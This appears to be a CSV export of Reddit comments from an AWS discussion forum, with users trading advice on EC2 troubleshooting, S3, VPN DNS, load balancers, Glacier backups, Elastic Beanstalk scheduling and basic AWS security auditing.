Implementing Citrix Virtual Apps and Desktops in Oracle Cloud Infrastructure [https://docs.cloud.oracle.com/en-us/iaas/Content/Resources/Assets/whitepapers/implement-citrix-virtual-apps-and-desktops-in-oci.pdf](https://docs.cloud.oracle.com/en-us/iaas/Content/Resources/Assets/whitepapers/implement-citrix-virtual-apps-and-desktops-in-oci.pdf)",-2.0
g6cwwvj,iyg4ta,Thanks again.  I appreciate it.,1.0
g6c902s,iyf8v6,Cross-posted to r/aws even though I imagine this is a more Linux specific question. Let me know your thoughts and thank you!,1.0
g6dd9fd,iyf8v6,"Have a look at /var/log/messages as a start. If you ran out of memory then it should be visible in that log. This is one of the more common reasons for a system halt such as you experienced.

If not, it's still a good place to start as it should provide some direction for further investigation. Find the approximate time the instance went offline and see what was happening in the logs around that time.",1.0
g6dpuxs,iyf8v6,"first thing to always do is check cloudwatch metrics. if you see that the system status failed, then it was aws' fault. if that was ok, then check the instance health metric. most likely that one failed. number 3 on the list is cpu utilization metric. if that was 100%, that will cause the instance health check to fail.

barring all of that, then you check the linux logs and correlate the timestamps",1.0
g6e37qy,iyergh,"Do these files contain text content? I wonder if you can store the content of 500 files temporarily as 500 messages in SQS, then have a second lambda write the messages to S3. You can then take advantage of lambda’s concurrency.

If it’s not text, another option is I might create one DynamoDB containing say 500 instructions for how to generate files from the original copy, another DDB storing generation job status for each file, and an SQS to keep the original file location and trigger concurrent lambdas processing the original file using instructions in DDB. Something like this:

File goes to S3 -&gt; Lambda1 pushes S3 location to SQS -&gt; Multiple lambda2s triggered, looking up DDB for processing instructions, generating a file, saving to S3, marking job complete in DDB table, skipping file processing and removing message from SQS if all 500 generation jobs are completed for the given original file

Also, why do 30-40 seconds in total matter? Can you tolerate this duration or you need lightning fast upload speed?",2.0
g6e9uo5,iyergh,"Yes, the files are only text so SQS does seem like the best solution, thanks for the suggestion!

30-40 secs isn’t a huge problem, I can live with that, I was just wondering if there is a better solution out there. It’s not really a business requirement, I was just wondering if there is a better way that I might have overlooked.",1.0
g6c5s2v,iyei1f,I’ve never heard of anyone getting it but not saying it isn’t possible. Has your rep tried to get you on an EDP?,3.0
g6c6vui,iyei1f,"Being a consulting partner, we have a different program with different incentives, but we recently switched to invoicing, that is why it seemed interesting.",3.0
g6cb5gh,iyei1f,Get a prepaid card that gives cash back. You can at least get something.,1.0
g6e13wy,iyei1f,"This extends well beyond just AWS. Any time you pay for anything with a credit card, that’s at least 2% (usually more) that the vendor is paying for interchange.",3.0
g6c7coc,iyehk7,"I solved the issue. I uploaded the correct cert to the server, then went into the Wyse box itself, and chose the setting to not ask for certification name authentication.",0.0
g6ck2h9,iyedhc,Your code looks most like python so you will need to provide the MessageAction=‘SUPPRESS’ parameter.  This will suppress the welcome message.,2.0
g6c5dwq,iydvl2,"This is indeed possible as we are doing this very thing.

Make sure your config has:
push ""dhcp-option DNS _ip_""

Where _ip_ is your VPC DNS server",2.0
g6ccm81,iydvl2,Thanks so much!  What config are you referencing?  I'll look up how to find my VPC's dns server.,1.0
g6cd8zv,iydvl2,"It will always be your VPC CIDR with a .2

If your CIDR is 172.16.0.0/16 then it would be 172.16.0.2

I am referencing my own config which was built base on the documentation.",1.0
g6cgkg9,iydvl2,"Ah, yeah, I see all the instances are using 10.177.0.2 so that makes sense.  Sorry, I'm not following you on the config.  You said it's your own config based on the documentation?  Could I tell the VPN server to make all the clients use 10.177.0.2 for their DNS?  I assume that would work since they would be able to access it once they are connected and then default back to their original DNS once they disconnect.  Thanks so much again!",1.0
g6cio4s,iydvl2,The push config item above is for your server config.  Anything in the config that starts with push is something that will be pushed to the client.,1.0
g6f3j6b,iydvl2,Telling the VPN server to make the clients use the VPC dns server worked!  Thanks so much for the assistance!,1.0
g6csw71,iydvbf,"You’re in luck. This just appeared in my inbox. It’s an official course from AWS. 

https://www.coursera.org/learn/building-modern-python-applications-on-aws",3.0
g6d0m9y,iydvbf,You are a lifesaver! Thank you so much. I have already enrolled and will stick to it.,2.0
g6cfg9f,iydvbf,"There is a Learn Python on AWS Workshop - I haven‘t tried it:
https://learn-to-code.workshop.aws",2.0
g6cqhm0,iydvbf,"Ooh this is exactly what I'm looking for! Thank you.

Please let me know if there's any more like this.",1.0
g6c8vy9,iydvbf,What are you specifically trying to accomplish?  Applications running in AWS?  Automation with boto3?,1.0
g6cbyfp,iydvbf,I guess anything really. I have beginner experience with python but I've never used it with AWS outside of the LA course + lambda. Just something to expose me more to python within AWS,0.0
g6cio5g,iyd89r,"Amazon should create something (call it ""S4"") that is API compatible with S3 but has sane defaults.

- No one needs open writeable buckets. No one. Including you.
- No one needs open readable buckets. They think they do because…
- Many people need easy static web hosting. You can cobble this together yourself by combining S3 and CloudFront with a secret access key header, but this should just be an option in a wizard.

S4 has two choices: private ""FTP""-style buckets or a public static website. It uses IAM for access control. It comes with a free CDN.

Doing this would solve a lot of people from headaches they don't know they have.",14.0
g6cuzbx,iyd89r,Right! And call it “Simple Storage Service Simplified”!,12.0
g6fqq3y,iyd89r,That’s the 4th S.,1.0
g6d7ap0,iyd89r,"You don’t even need a secret header, just permit the CloudFront distribution to access the bucket and nothing else.",3.0
g6fr0nu,iyd89r,"I dunno, I followed an Amazon tutorial. Are you doing real web hosting or just bucket to CF, which breaks index pages?",1.0
g6d666j,iyd89r,"Of course, who could live without S4, the Stupid Simple Storage Service",1.0
g6dlo8k,iyd89r,You can explicitly give a cloudfront distribution read access.  It's pretty straightforward in the bucket policy.,1.0
g6eifui,iyd89r,It’s always a question in the SA exam too,1.0
g6i2zpj,iyd89r,It's been done: [S4 - Super Simple Storage Service](http://www.supersimplestorageservice.com/),1.0
g6de4sq,iyd84u,"Great to see they're going to add support for bucket names with dots in them! 

It's been quite maddening to have the original recommendation be bucket.example.com so you could set up a direct DNS record for it and serve content under http://bucket.example.com only to have that mode of use get obliterated by HTTPS.",13.0
g6e7po1,iyd84u,"But if you’re hosting a website, then the dot name is valid. Am I missing a use case here?",1.0
g6faff5,iyd84u,TLS.,5.0
g6dztyy,iyd84u,Let's all pour one out for the staff on the S3 team who thought their life was going to get easier in 2020 but instead will not only have to continue having to figure out how to mitigate large unpredictable traffic spikes to the loadbalancers and routers serving `s3.amazonaws.com` until the end of time but will also need to support active development of new features on that hostname.,22.0
g6e69k4,iyd84u,S3 development:  dog food eating inception,3.0
g6dk1gv,iyd84u,This is actually the first I've heard of this.  Thanks for sharing.,6.0
g6bvm28,iyce3k,"For each domain in SES, you can configure Notifications (SNS topics). You can then subscribe to the topic. I currently subscribe SQS queues to the topics and then work through those periodically to look for patterns and typos. Doesn't have to be SQS though. Heck, you could send yourself an email on each bounce if you don't have many... (but don't do that).",1.0
g6bxt93,iyavat,"This is rad and something I've always wished AWS had as a complement to the aws cli, a ""console"" in the terminal so-to-speak. Good luck on your project, I'll be keeping an eye out for this one",2.0
g6c2qfh,iyavat,Thanks! Glad you like it. We want to launch something more public as soon as we can:),1.0
g6bhwpr,iyavat,"Hey, OP here. Feel free to ask any questions!",1.0
g6bmcaw,iyavat,"Creating that firewall rule, where was the rule added to? A security group? A NACL? It didn't seem to be added to anything in particular - very mysterious!
I might have hundreds of potential places to allow port 22, how is this managed?",1.0
g6bn160,iyavat,"This was a firewall rule created on Google Cloud. There, you can create firewall rules using this command - https://cloud.google.com/sdk/gcloud/reference/compute/firewall-rules/create

We need to improve the UI. You are right that you definitely want to create a rule for a VM instance for example.",2.0
g6bo3sz,iyavat,"Ah thanks that makes more sense, I thought firewall rule was meant as a generic term :P

It's a big undertaking and would love to use something like this :)",2.0
g6bp6k2,iyavat,"Got it. We should have made it more clear in the video. Thanks for pointing it out!

Feel free to sign up for early access on the landing page - https://getsidekick.app/",1.0
g6bnsl5,iyaauy,"I have seen this before on rare occasion. Usually it's come down to Group Policy for me. Is this a PCoIP or WSP based workspace? Some things you can try 1. Connect from another computer and ideally location. This will help rule out any local environmental issues. 2. Try the old/new client. There is currently a 2.5.x and 3.x branch of the client available on the site. Testing both will also help rule out external issues. 3. If web access is enabled, see if that works. (if not, don't bother enabling). 4. RDP to the workspace and do a gpresult/rsop and look at the policies being applied. Things like Login banners are not supported and can cause this. It's possible one of those policies is hitting this box based on the user and/or object. 5. Diff the user and computer objects against known working ones.",2.0
g6flkkg,iyaauy,"I just started experiencing this issue this morning on all 3 of the Workspaces that are used at my place of work.  Like the OP said, I can RDP into the Workspaces and they seem fine from that perspective, it appears to be some kind of issue with the actual Workspaces client or the server component through which it connects.",1.0
g6fzx7h,iyaauy,I tried building a new workspace for a new user and ran into the exact same issue.  So I'd guess my issue isn't exactly the same as the OP as I don't think a rebuild would solve anything.  I am however able to connect via the Workspaces Web Client.  So that's better than nothing for now.,1.0
g6bi0mn,iy9q9y,"Given that the control tower implementation creates and assumes complete control over the org you have few options outside of creating a new ""head"" account.

If they're wanting to use the SNS topic event to perform orchestration just start a new account and spike into it for however long they need.

Worth touching base with you account manager to discuss the timeline on when control tower will handle ""adopting""/importing existing accounts.

Beware those SCP policies esp if you're multi region and want to run additional cloud trail and config rules.",2.0
g6bz7r9,iy9q9y,You can already enroll existing accounts into ControlTower.,2.0
g6cj2sj,iy9q9y,"Yep. Also make use of OUs when applying SCPs. This will allow you to easily import and existing account, then run the conformance pack to see what things would break if you apply a specific SCP, and then finally move that account under enforcement.

My opinion is that your ""cloud admin"" team whom owns the organization already would own the control tower setup. Then you use account factory to spin up accounts which you can grant access to your devs for provisioning those resources.",1.0
g6bm7aq,iy9q9y,"We are using a separate organization with a slightly different setup and budget limits etc to Test our Account factory and other org-spanning tests.

Because thats all basically for free (as we do not have VPCs etc there) you can just set it up without hassle. You will need a second credit Card though. 

We contacted our AWS TAM and even got some credits for testing.",2.0
g6b7fa1,iy8vck,"How so?  From my experience they cost about $20 a month for existing, but I've never been able to utilize more than a fraction of a capacity unit.  But then again, I don't have access to the bills at work.

That being said, the $20 base cost is a bit discouraging for use with personal projects.",3.0
g6b8grg,iy8vck,At the enterprise level they're really cheap. As a comparison an F5 load balancer would costs thousands to tens of thousands per year.,3.0
g6bb258,iy8vck,"OK but AWS load balancers are on the complete opposite end of the ""features and capabilities"" spectrum from F5 load balancers.",2.0
g6bfcrv,iy8vck,I agree. But my experience is that many companies do pretty basic stuff with expensive load balancers. Health checks and basic routing is usually what I see being used.,2.0
g6bmdvt,iy8vck,"~~An f5 can host more than one ssl domain. The ELBs are neat, but only terminate a single ssl connection.~~",2.0
g6bt205,iy8vck,I agree. F5 will do a lot more than an ALB. But for most customers an F5 is overkill. ELB pricing isn't very high. Maybe for a personal project. But putting the cost of an ELB (what most people can use) to Enterprise Grade LB like F5 was my intention. For a fraction of the cost you can get what a typical use case is for load balancing.,2.0
g6cdj5y,iy8vck,"?

You can attach multiple certificates to one ALB on the same port. https://aws.amazon.com/blogs/aws/new-application-load-balancer-sni/",1.0
g6cihqg,iy8vck,"Sadly, not nearly enough for some of our applications. We have one use case that requires ~45,000 unique-domain certs for customer-specific use cases. I’d *love* to use SNI and ACM for that, but alas we are stuck with an haproxy layer with letsencrypt certs.",2.0
g6cffm4,iy8vck,"Well, that's embarrassing.",1.0
g6bju4j,iy8vck,...and yet they provide so much value to our infra,1.0
g6bmq4l,iy8vck,"Whats the ""Most Basic configuration""? ELBs are billed per hour and traffic which you cannot customize with config. 

I would go for a shared ALB per Team/system/Account and use target groups for Services. Reduces cost compared to per-service ELBs.",1.0
g6cyia1,iy8vck,^ this. ELBs get costly especially when every service has a ELB ingress. Talking hundreds of ELBs here and price adds up fast. In the process of migration to ALBs,1.0
g6b7tfp,iy8jvr,"https://aws.amazon.com/premiumsupport/technology/trusted-advisor/

This will get you started with the basics",8.0
g6b8sbl,iy8jvr,"There are too many services on AWS to make a comprehensive reply so it would make sense to review  your consumption and research and apply security best practices for each of them.

Here are some essentials to consider (and this is by no means a complete least or a substitute for any other security resources).

Account structure: do you know how many accounts are in use and for what purpose? do different accounts require different levels of management (e.g. production accounts with critical resources and customer data) Who owns the root account?

Rogue accounts: Are there other root accounts floating around that may not be part of the official company root account? (Does finance process more than one AWS bill each month?)

User access: how do people login? is it through IAM users or a federated login via an SSO provider? when were all of your IAM users last accessed/passwords rotated? can you move these to federated logins?

IAM roles and policies: what are your users allowed to access? are these overly permissive? can you restrict access to the root account and admin functions? 

S3 buckets: are any buckets publicly accessible? are there any overly permissive bucket policies?

Networking: where can traffic come from to access resources in your VPC(s) and their security groups? are these rules overly permissive? do your VPCs have internet gateways attached?

Other basic resources EC2/RDS/etc: how do you authenticate to access these resources? are the passwords or certificates rotated regularly? do they belong to appropriate security groups? can they access the public internet (inbound traffic) or are they at risk of production data exfiltration (outbound traffic)? can they access each other/should they be able to?

Your applications: do the services you run present any vulnerabilities? have application API endpoints been security assessed?

Your deployment strategy: how are resources deployed to your accounts? is there a risk of bad code entering your deployments via a source code repository (e.g. GitHub) or build system (CodeBuild, Jenkins, etc)? are there any security tools used in your deployment process?",9.0
g6c254i,iy8jvr,"dude this is a great guide to start with, thank you so much !",2.0
g6b7vku,iy8jvr,"This is a pretty good resource: [https://summitroute.com/blog/2020/05/21/aws\_security\_maturity\_roadmap\_2020/](https://summitroute.com/blog/2020/05/21/aws_security_maturity_roadmap_2020/)

You could also look into the AWS Foundational and CIS security benchmarks in AWS SecurityHub.",7.0
g6bdn4j,iy8jvr,This is a good place to start.,1.0
g6c29nv,iy8jvr,"Many thanks, very good guideline to get me started",1.0
g6b5y7m,iy8jvr,https://aws.amazon.com/training/course-descriptions/security-operations/,3.0
g6bgrt9,iy8jvr,"A self checkup tool you can run in 10 mins, https://github.com/nccgroup/ScoutSuite also good for continuous / periodit checks",3.0
g6bmb2e,iy8jvr,https://github.com/toniblyx/prowler,3.0
g6b6yai,iy8jvr,"You can start with some of the AWS tools, e.g. trusted advisor, Inspector, Security Hub, Guardduty, et.al

Then there are a whole stack of tools both commercial (cloud one conformity) and open source ( https://asecure.cloud/tools/ ) that can give a huge number of pointers to help secure your environments.

Good luck and let us know how you go.",2.0
g6brqoh,iy8jvr,"If you have access to ISACA, they also have useful AWS auditing tools.",1.0
g6d2eti,iy8jvr,"I'd start by enabling Security Hub and Guard Duty — note that these cost money — so they can collect information and analyze access patterns while you start working through the documentation.

https://console.aws.amazon.com/securityhub/home
https://console.aws.amazon.com/guardduty/home

One other useful tool to enable is IAM Access Analyzer, which will identify S3, KMS, etc. resources which might be more open than you intended.

https://console.aws.amazon.com/access-analyzer/home",1.0
g6bf24p,iy2trt,"we skip buying them at the linked account level. we still talk to the big users and get their commitment, but use it to drive a single org purchase.  the downside is being stuck by whatever order aws happens to apply them, but it feels much simpler to manage.  

there's another piece thats somewhat tricky, which is figuring out to read the cost and usage report, which of course works differently than RIs. we exclude the savings plan purchase lines and only use the coverage lines, which have an amortized cost in them",1.0
g6bwtvh,iy78oo,"I think a Local Zone somewhere like Dallas, Chicago, or Denver is more likely than a full-blown region. I think it's pretty hard to justify the investment of an entire new region in the central US when latency from somewhere like Texas to the existing regions is already &lt;50ms in most cases. And that latency will only reduce as internet infrastructure gets better, further reducing the need for a closer region.",2.0
g6bxu6b,iy78oo,It seems like Local Zones are the AWS answer to what you're talking about. They've recently opened two Local Zones in the Los Angeles metro area.,2.0
g6b2br6,iy78oo,What is the latency you are having currently,1.0
g6b40t3,iy78oo,"I'm not sure when they'll stop adding regions in the United States, it could be now.

However, I believe they're going to keep adding servers in every state where the internet arrives at that state. For example, Netflix and many other companies have *secret* servers at each state. For mine 11 ISPs connect at the same datacenter. There are very protected servers near these connections for things like Netflix, video games, etc. When I saw them there was an armed guard watching us.  


Edit: I'll die on this hill. When I had to evaluate federal government cloud solutions or even get HIPAA compliance we had to review our datacenters security processes.   


I challenge anyone to prove to me that they can just waltz in to a Netflix / AWS data center without armed guards and physically touch the servers. Heck, I'd like to see just one person even give me the address of the servers here in Oklahoma. This stuff is not advertised. Prove me wrong!",-3.0
g6bafhs,iy78oo,"Yeahhhh they’re not that secret. I’ve freely walked through datacenters that house IXPs that cloudflare, Facebook, and many other ISPs meet at.",2.0
g6baqdj,iy78oo,"That's not best practices. Wherever you were was non-conforming.  


Edit: If you want a game, I'd challenge you to figure out where I was in Oklahoma. I bet you can do it. It's not really public though.",-3.0
g6bayvt,iy78oo,"Again, they’re not really “secret”

https://www.peeringdb.com/net/457",1.0
g6bck2l,iy78oo,"Interesting. Yet you couldn't find the Netflix servers in Oklahoma.  


And yes I will die on the hill that a rando like you should not be freely roaming through datacenters. That's not allowed where my data lives. It is out of spec.",-5.0
g6bg9o9,iy78oo,"it's not a secret, it's called netflix open connect. 

they send 4U servers to ISP's, for free. it's part of Netflix cdn network and it saves them tons of money. 

[https://openconnect.netflix.com/en/](https://openconnect.netflix.com/en/)",3.0
g6bx4da,iy78oo,Thanks!,1.0
g6br63t,iy78oo,"&gt; And yes I will die on the hill that a rando like you should not be freely roaming through datacenters.

Who is saying any rando off the street can walk through them? Almost all of these DCs are colo facilities, so as long as you have rented space there, you can walk through them. And yes, some of those colo facilities have armed guards, but that doesn't make them secret.",2.0
g6bxssg,iy78oo,"&gt;Heck, I'd like to see just one person even give me the address of the servers here in Oklahoma. This stuff is not advertised. Prove me wrong!

Netflix has CDN servers at the OneNet data center on the campus of OSU-Tulsa, on Greenwood Ave. It looks like they also have one at the Rack59 data center in west OKC on Reno Ave, and I wouldn't be surprised if they have more but I would need to do a little more google-fu to confirm that one.

You're conflating a lot of different things here. You're correct that robust security procedures and regulatory frameworks require data centers to have restricted access. Nobody claimed that someone can just waltz into a data center, and no these data centers are not open for public tours, but that doesn't mean they are ""secret"". 

Most internet infrastructure is public record if you just know what terms to google. the exception to this is typically government/military-related data centers which have their locations much more closely guarded. But Netflix? Netflix literally has [a page on their website](https://openconnect.netflix.com/en/peering/#locations) where they list the different data center/internet exchange locations that they peer with.",1.0
g6c3xbq,iy78oo,"Missed again. If it was public you could tell me.Edit: I went through your link. That's another big miss. You literally can't tell me which completely public and not secret location the Netflix servers reside in Oklahoma.

Just figure it out if it's so public and you're so smart.  


Edit2: You're getting close. But this is just another example of how it's secret. The servers I mentioned are not on the college campus you mentioned. But you're now within 40 miles.",-2.0
g6c4j9s,iy78oo,"Lol, they aren't secret. You asked where Netflix has servers in Oklahoma. I gave you exact addresses of Netflix servers locations in Oklahoma. Stop moving the goalposts.

I was trying to be nice, but you seem to have a fundamental misunderstanding of internet infrastructure. There is no single point where ""the internet arrives at a state"". That's not how the internet works. Oklahoma (the state) has many interconnects and many peering exchanges where different ISPs and companies interact. 

Netflix sends OpenConnect appliances to nearly any ISP that asks for them, so there could potentially be hundreds of Netflix appliances in hundreds of data centers and ISP offices across Oklahoma. They aren't secret. You happened to see one of these appliances. It's not a big deal. 

The reason nobody can tell you the specific location where you happened to see the appliance is because these appliances are literally so common that trying to guess which data center you saw it at is fruitless. It's the equivalent of saying ""well I was at Walmart and I saw they had TVs for sale. Can you tell me exactly which Walmart I was at?"" You wouldn't be able to tell me the exact Walmart, but that doesn't mean that the locations of Walmart are secret.

&gt;I went through your link. That's another big miss. You literally can't tell me which completely public and not secret location the Netflix servers reside in Oklahoma.

Yes, that's because the link is a list of *peering sites*, not server locations. You don't seem to understand the infrastructure we're talking about, and that's okay, but maybe stop being so stubborn about something you're not an expert on.",2.0
g6d4opa,iy78oo,"&gt;Heck, I'd like to see just one person even give me the address of the servers here in Oklahoma.

&amp;#x200B;

&gt; I gave you exact addresses of Netflix servers locations in Oklahoma. 

You did not. Please stop trying to explain the internet to me. And you gave me a site that has ZERO Oklahoma sites on it. You are full of shit and acting like a jerk. Let's just move on and stop wasting each other's time.",-3.0
g6b5qwj,iy78oo,[deleted],-2.0
g6bbr8v,iy78oo,they're all in Virginia,1.0
g6b6fnz,iy5rb9,You pay when it’s running whether you have a workload or not. But you can configure the instance to scale to 0 compute units when not in use so it turns off and you’re not charged for the compute. If you set it to only scale down to 1 then you’ll always be charged for compute,1.0
g6baduu,iy5rb9,"Also, note that you will pay for storage no matter what.",1.0
g6bp7kw,iy5rb9,"If the capacity units are &gt; 0 you pay.  If the DB is idle long enough and you have it configured to spin down to 0, then you don't pay while it's at 0 (there's no instance running to bill for)",1.0
g6b1ukm,iy3r5n,"I may be wrong here but iam account access and organisation structure are two completely different structures / setups and are not related. (Or at least dont have to be)

For example we have an iam account for users that is not even part of the organisation that can access accounts in the org.

So Iam access to accounts  and resources is controlled by IAM policies/ roles deployed into each account using cross account access, not by aws organsitaions.",1.0
g6bijaw,iy3r5n,"What's missing here is the accounts with your organisation.

IAM has a security boundary of the account. You need to explicitly grant users, roles or accounts from another. In rare policies you can grant against the orgid.

As such the trust policies is how you grant cross account permissions",1.0
g6bia8c,iy6yzd,"Just a word of caution...Glacier is super-cheap for storing data, but restoring out of Glacier can be pretty expensive.",9.0
g6bvatd,iy6yzd,"It's not *that* insanely expensive. $3/TB to recover from Glacier Deep Archive -&gt; S3, then it's ~$0.09/GB if you recover over the internet *or* (and this is the thing I only learned a few weeks back): $0.03/GB if you recover via AWS Snowball.

So, for any restoration &gt; ~1TB it's actually cheaper to get a HDD mailed to you with all your data, for example:

1TB\*($0.09/GB) = ~$90  
1TB\*($0.03/GB)+$60 for the snowball = ~$90

After this point, the snowball becomes cheaper and cheaper (2TB being 2TB\*($0.03/GB)+$60 = $120, for example)",7.0
g6cp5l1,iy6yzd,"The data that I keep in Glacier is backup. For me, that translates to ""if the place burns down, I have offline storage"". I'll happily pay the $3/tb fee to retrieve my data if I lost my drives.",5.0
g6bfsn4,iy6yzd,Why Glacier and not Deep Glacier?,3.0
g6e8kut,iy6yzd,"&gt; Deep Glacier

Good question: Deep Archive is within the S3 service, and Glacier is a separate service - this two services uses a different API, and the app that Synology did supports only the Glacier Service.",1.0
g6dax6b,iy6yzd,"I'm guessing you've done this, but test your recovery! Make sure that you're able to restore in the way that you're expecting to.

You don't want to try to restore after a failure and find out it didn't work.",3.0
g6cskwz,iy6yzd,"What does recovery look like? Replicate to another S3 bucket or run a script to request all the objects, then download locally?",2.0
g6e8ri1,iy6yzd,"In the Glacier app that Synology did there is the `Restore` section, you create a task to restore the file, you get the option to select which files and folders you want to restore (you can select all), and then task is created. After this you wait for AWS to get your data.",1.0
g6f4izg,iy6yzd,Ok that makes sense Synology would automate that. If you were doing it yourself it's a little more work. I might have to take another look at a Synology NAS if they have this capability now.,2.0
g71cl5j,iy6yzd,I've been looking at backing up my Synology to S3 but unfortunately it doesn't look like Synology support Deep Archive. Having 15TB of precious data I think this would add up to quite a lot storing in Glacier instead of Glacier Deep Archive.,1.0
g71cm2m,iy6yzd,By the way nice breakdown post!,1.0
g6b61z9,iy6wrq,Perfect timing!  Was just starting to get into Step Functions and this is a tremendous help.  Thanks!,4.0
g6bnvol,iy6wrq,"If you are working with JavaScript, try out https://www.npmjs.com/package/stepfunctions

You can use the getReport() method to list the actions taken by your statemachine. It'll even do the path outputs from OP",1.0
g6c6moq,iy6wrq,"I typically use a scratch state machine with only one (maybe two) Pass activities.  That's all you need to confirm every input, output, and route.

From there create serialization definitions for language of choice and your all set.",1.0
g6d2bdq,iy6wrq,"Pass states dont support ResultSelector. 

Also, with a Pass state you can't easily see the payloads in between each path step, especially the input after the InputPath and Parameters (I.e. whats sent to a Lambda, SNS, whatever)",1.0
g6awz3e,iy6ev8,You'll need to pause updates on the master long enough for you to complete a dump of the dataset and note the current bin log positions. Once you've done that no downtime should be required.,1.0
g6aojg9,iy4huj,"That HTML isn’t from the S3, it’s generated by your browser. S3 is just returning the requested image and nothing else.",1.0
g6aquy7,iy4cqw,"They probably copy it in the background. When you read something it reads from the new drive if it was already copied, and the old drive if it wasn't. When you write something new during the copy, it writes to the new drive. That's why they always warn you performance is reduced during these changes.",2.0
g6as4ab,iy4cqw,"Iirc from my meetings with our AWS people, the drive is being snapshotted and then re-read from S3 =&gt; this should result in an initial read penalty. Also iirc, the no downtime switch is only supported with Elastic Volumes, means after the restore is done, it will just map to the new io1-drive.",0.0
g6aceii,iy2ldg,"When you say EMR do you mean Electronic Medical Record system or is that an acronym for something else.

[Here's an open source EMR on AWS](https://aws.amazon.com/marketplace/pp/OEMR-OpenEMR-Cloud-Standard-Edition/B07BBT4C1H)",1.0
g6adzcz,iy2ldg,"No I'm referring to the Elastic Mapreduce service

&amp;#x200B;

[https://aws.amazon.com/emr/?whats-new-cards.sort-by=item.additionalFields.postDateTime&amp;whats-new-cards.sort-order=desc](https://aws.amazon.com/emr/?whats-new-cards.sort-by=item.additionalFields.postDateTime&amp;whats-new-cards.sort-order=desc)",1.0
g69z0iy,ixznh1,"Not quite sure what your asking.

10.0.0.0/16 doesn’t overlap with 10.2.0.0/27

10.0.0.0/8 covers both.",2.0
g6b7us4,ixznh1,"Correct.
10.0.0.0/16 masks 2 octets.
So 10.0.0.0 all the way to 10.0.255.255

And of course /24 is one more fixed octet. 10.0.0.255
/8 is one less. 10.255.255.255.

Going up and down by 8 is no coincidence, that's why their called octets.

Did OP need to hear this? Unclear from the question!",1.0
g69zoll,ixznh1,This seems like a terrible way to do this.,2.0
g6a0ugg,ixznh1,Just leave the stock NACL in place and permit all traffic. Use Security Groups to restrict traffic.,1.0
g6awj8j,ixznh1,"Lolwut? One is stateless, one is stateful
This is probably a silly NACL but you can't just use SG instead for everything and completely ignore NACL.",1.0
g6b5nzy,ixznh1,Why not?,1.0
g7hm8rz,ixznh1,"Ok, example: Tell me how to block access to an IP address range for all resources in a subnet.  

Option 1:
Change 2 NACL rules attached to the secure subnets (inbound/outbound) to block that ip range

Option 2: 
Security groups- ?",1.0
g6btepl,ixznh1,sure you can,1.0
g6a1n7d,iy0ibg,I don't think you are going to get there with elastic beanstalk. I think you'll want to have a separate EC2 instance that you use just to run this job. You should be able to configure it to talk to your RDS database and then you can use the scheduler of your choice to start and stop it at the desired times. I'd probably use a lambda function for that part.,6.0
g6a42iw,iy0ibg,"The only issue with that (and the reason I've avoided the instance scheduler so far) is that the job depends on some stuff (mainly Django, which is my app's backend) to run so it needs to run on a server where it can touch both the app and the database. Someone else here suggested changing the instance type in the environment itself using a lambda function which I'm going to look into tomorrow before pursuing your idea further, but thank you for the idea regardless!",1.0
g69ytqa,iy0ibg,"Can you clone the environment, set the instances to start and stop with the built in scheduling and just run two eb environments.

Another option, write a lambda called by a cloudwatch event cron that updates you env to the desired instance type",3.0
g6a3qno,iy0ibg,"I think the first option is possible, but would that require the timing to be right? I mean, in order to avoid downtime during the startup/shutdown of the new environment, I'd have to have two running at the same time and have the command run in only the more powerful environment right? The second option sounds more appealing to me. So let me see if I understand this: the lambda function would probably use something like boto to change the env instance type just before the scheduled time (using the AWS api? EB cli?) and then resize back to normal after the update finishes? That would be fine, I'd just need to figure out how to run the lambda on a schedule. I think I've done that in the past so I can look back through some old notes and tutorials. I like that option because, if I understand correctly, that would just allow the environment to run the job itself but just using the bigger instances. Does that sound right? 

Thanks for the ideas! I'll be investigating this tomorrow :-)",1.0
g6b98sr,iy0ibg,"You can use cloudwatch events to invoke the lambda on a cron. 

Yes, use boto to modify the environment to change the instance type. 

You might be able to do it with one script if you can pass the lambda input from the cloudwatch event, maybe the runtime and then use an if statement in the script to control which instance type it sets. 

Otherwise just have two scripts and two cloudwatch crons",1.0
g6bg4sd,iy0ibg,Thank you! This sounds promising. Looking into it today!,1.0
g6hvpnt,iy0ibg,"Just wanted to say thanks for this idea. After a bunch of searching I finally came across the idea to update the instance type in the EB environment using boto, so I created a couple lambda functions, one to increase the size to t3.large and one to shrink it back to micro. They're set up to straddle the update by 30 min on each side with a cloudwatch event like you suggested. Seems to work perfectly on dev so far so I'm going to verify everything in the logs tomorrow and then deploy to production. This is a big win and something I've been fighting with for several days so I owe you a beer :-D",1.0
g6it6nf,iy0ibg,"Glad to help, sometimes the easiest solution is outside the service you are using. Feel free to reach out if you need help",1.0
g6b65kg,iy0ibg,Ever consider optimizing your job instead of throwing more hardware at it?,1.0
g6b6kva,iy0ibg,"Unfortunately I've optimized it as much as possible already. It's a large amount of data, so it's not surprising that it won't run on an instance with only 1gb of RAM. 

The only way I could optimize it further would be to do it in pieces which would make it take significantly longer. I don't want a nightly job that takes 1.5-2 hours to complete. By running it on the larger instance it can finish in just a few minutes.",1.0
g6b7gfm,iy0ibg,You SHOULD be doing it in smaller pieces and auto scaling the worker.,1.0
g6bg1le,iy0ibg,"Doing it in smaller pieces makes it take an excessively long time which is unnecessary. I have already optimized the code and tested doing it in smaller chunks like you've suggested and decided for my use case that this is the best option. There are specific reasons I'm doing things this way, though I appreciate the feedback regardless so thank you!",1.0
g6bqlre,iy0ibg,"&gt; Doing it in smaller pieces makes it take an excessively long time which is unnecessary.

That's what the autoscaling is for. It can take the same amount of time and set you up for a better future.

I guarantee you are pursuing an anti-pattern here.",1.0
g6c40xo,iy0ibg,"Either I'm not understanding you or I don't have a good understanding of autoscaling. This is a memory issue, not a CPU/Network load issue. My environments already use autoscaling but they (as far as I have found so far) cannot scale a larger instance. If the site comes under heavy load it will already scale up additional T3 micro instances but that's not done based on mem usage (nor can it be without creating custom cloudwatch alarms and even then it will still only scale micro instances). The job needs a minimum of a t3.large instance to run based on the amount of memory the already-optimized code needs to run. If you know of a way to tell my autoscaler to either a) scale up the existing instances from micro to large at a specified time or b) add an additional t3.large instance prior to running the update and guarantee that the update runs on that instance while still being able to talk to the app then please do enlighten me. Everything I've found so far indicates that this requires a more customized solution like the others mentioned in this thread.",1.0
g6bot1d,iy0ibg,"Any reason why this cron instance need to be inside Elastic Beanstalk? Why not run it individual, which makes life easy with scalability.",1.0
